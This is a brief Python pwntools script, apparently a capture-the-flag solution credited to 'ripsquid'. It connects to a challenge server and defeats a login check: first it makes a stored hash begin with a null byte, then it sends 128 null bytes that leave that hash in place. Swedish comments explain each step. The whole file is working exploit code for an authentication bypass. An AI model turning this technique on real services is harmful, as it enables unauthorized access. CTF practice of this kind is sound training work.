from pwn import *
# solve by ripsquid

r = remote("behorighet-saknas.ctf.wales", 1337)

r.recvuntil(b"Ange a")
r.sendline(b"a")
r.recvuntil(b"Ange l")
r.send(b"RO" + b"\n")  # hash som börjar med nullbyte.

r.recvuntil(b"Ange a")
r.sendline(b"a")
r.recvuntil(b"Ange l")
r.send(b"\00" * 128)  # input som inte skriver över hash:en från förra iterationen.

r.interactive()
